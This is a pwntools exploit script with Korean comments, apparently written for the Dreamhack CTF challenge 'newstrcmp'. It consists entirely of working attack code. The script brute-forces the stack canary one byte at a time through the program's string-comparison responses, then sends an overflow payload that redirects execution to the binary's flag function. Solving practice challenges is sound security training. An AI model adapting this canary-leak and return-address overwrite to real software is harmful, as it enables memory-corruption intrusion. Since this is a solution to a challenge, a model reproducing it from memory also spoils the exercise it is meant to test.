from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h']

#p = process("./newstrcmp")
p = remote("host8.dreamhack.games",9566)
#gdb.attach(p)
e = ELF("./newstrcmp")
r = ROP(e)
flag = e.symbols['flag']
leaked_canary=b''
for j in range(7):
    for i in range(1,256): # 브르트 포싱
        p.recvuntil(b"Exit? (y/n): ")
        p.send(b"n")
        p.recvuntil(b"Input string s1: ")
        s1 =  b'a'*(25+j) # 카나리 널바이트 덮어야 한다.
        s1 += bytes([i]) 
        p.send(s1)
        p.recvuntil(b"Input string s2: ")
        s2 = b"a"*(25+j)
        p.send(s2)
        response = p.recvline()

        if b"Two strings are the same!" in response:
            leaked_canary += bytes([i])
            log.success(f"Found canary byte [{j}/7]: {hex(i)}")
            break
        if b"s1 is larger than s2" in response and (j==6):
            leaked_canary += bytes([i])
            break

final_canary_for_rop = u64(b'\x00' + leaked_canary.ljust(7, b'\x00'))
log.success(f"유출된 카나리 바이트: {leaked_canary.hex()}")

p.recvuntil(b"Exit? (y/n): ")
p.send(b"n")
p.recvuntil(b"Input string s1: ")
p.send(b'a')
p.recvuntil(b"Input string s2: ")
payload = b"a"*24
payload += p64(final_canary_for_rop)
payload += p64(1)
payload += p64(flag)
p.send(payload)
log.info(f"canary {hex(final_canary_for_rop)} ")
log.info(f"flag 함수 주소 {hex(flag)} ")

p.recvuntil(b"Exit? (y/n): ")
p.send(b"y")
p.interactive()